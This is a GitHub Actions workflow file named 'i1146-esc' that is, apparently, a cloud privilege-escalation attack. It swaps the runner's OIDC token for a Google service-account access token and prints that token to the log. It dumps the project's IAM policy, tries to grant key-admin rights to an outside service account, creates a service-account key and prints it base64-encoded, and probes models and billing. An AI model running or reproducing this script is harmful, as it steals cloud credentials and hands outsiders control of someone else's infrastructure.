name: i1146-esc
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  esc:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: run
        run: |
          set +e
          NUM=363590592857
          PRJ="projects/$NUM/locations/global/workloadIdentityPools/github-action/providers/github"
          SA="$NUM-compute@developer.gserviceaccount.com"
          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
          jq -n '{keyAlgorithm:"KEY_ALG_RSA_2048"}' > keyreq.json
          jq -n '{options:{requestedPolicyVersion:3}}' > polreq.json

          : > tok.jwt
          for a in 1 2 3; do
            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=//iam.googleapis.com/$PRJ")
            echo "$J" | jq -r '.value // empty' > tok.jwt
            [ -s tok.jwt ] && break
            sleep 3
          done
          if [ ! -s tok.jwt ]; then echo "##MINT_FAIL"; exit 0; fi
          sc=$(curl -s -o sts.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
            --data-urlencode "subject_token=$(cat tok.jwt)" \
            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
            -d "scope=https://www.googleapis.com/auth/cloud-platform")
          FT=$(jq -r '.access_token // empty' sts.json)
          echo "##STS code=$sc ftlen=${#FT} body=$(head -c 300 sts.json | tr -d '\n' | tr -s ' ')"
          if [ -z "$FT" ]; then echo "##STS_FAIL"; exit 0; fi

          gc=$(curl -s -o gat.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H 'Content-Type: application/json' \
            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
          AT=$(jq -r '.accessToken // empty' gat.json)
          echo "##GEN code=$gc toklen=${#AT} body=$(head -c 300 gat.json | tr -d '\n' | tr -s ' ')"
          if [ -z "$AT" ]; then echo "##GEN_FAIL"; exit 0; fi
          echo "##TOKEN_BEGIN"
          echo "$AT"
          echo "##TOKEN_END"

          echo "===== testIamPermissions"
          tp=$(curl -s -o tp.json -w '%{http_code}' -H "Authorization: Bearer $AT" \
            "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:testIamPermissions?permissions=iam.serviceAccountKeys.create,iam.serviceAccounts.create,resourcemanager.projects.setIamPolicy,resourcemanager.projects.create")
          echo "##TIP code=$tp body=$(head -c 400 tp.json | tr -d '\n' | tr -s ' ')"

          echo "===== getIamPolicy"
          gp=$(curl -s -o pol.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' \
            -d @polreq.json "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:getIamPolicy")
          echo "##GIP code=$gp len=$(wc -c < pol.json)"
          echo "##GIP_B64 $(base64 -w0 pol.json)"
          if [ "$gp" = "200" ]; then
            jq '{policy:(. + {bindings:(.bindings + [{role:"roles/iam.serviceAccountKeyAdmin",members:["serviceAccount:github-actions@aryeelab.iam.gserviceaccount.com"]}]})}' pol.json > newpol.json 2>/dev/null
            echo "= makeKeyAdmin: $(jq -c '.policy.bindings[-1]' newpol.json 2>/dev/null)"
            sp=$(curl -s -o sp.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' \
              -d @newpol.json "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:setIamPolicy")
            echo "##SIP code=$sp body=$(head -c 600 sp.json | tr -d '\n' | tr -s ' ')"
            if [ "$sp" = "200" ]; then
              echo "===== restore original policy"
              jq '{policy:.}' pol.json > res.json
              rs=$(curl -s -o rsout.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' \
                -d @res.json "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:setIamPolicy")
              echo "##RESTORE code=$rs body=$(head -c 300 rsout.json | tr -d '\n' | tr -s ' ')"
            fi
          fi

          echo "===== keys.create on $SA"
          kc=$(curl -s -o key.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' \
            "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys" -d @keyreq.json)
          echo "##KEY code=$kc len=$(wc -c < key.json)"
          echo "##KEY_B64 $(base64 -w0 key.json)"

          echo "===== models us-central1"
          m=$(curl -s -o m.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/models")
          echo "##MODELS code=$m body=$(head -c 300 m.json | tr -d '\n' | tr -s ' ')"
          echo "===== billingInfo"
          b=$(curl -s -o b.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo")
          echo "##BILLING code=$b body=$(head -c 300 b.json | tr -d '\n' | tr -s ' ')"
          echo "##FINISHED1146"
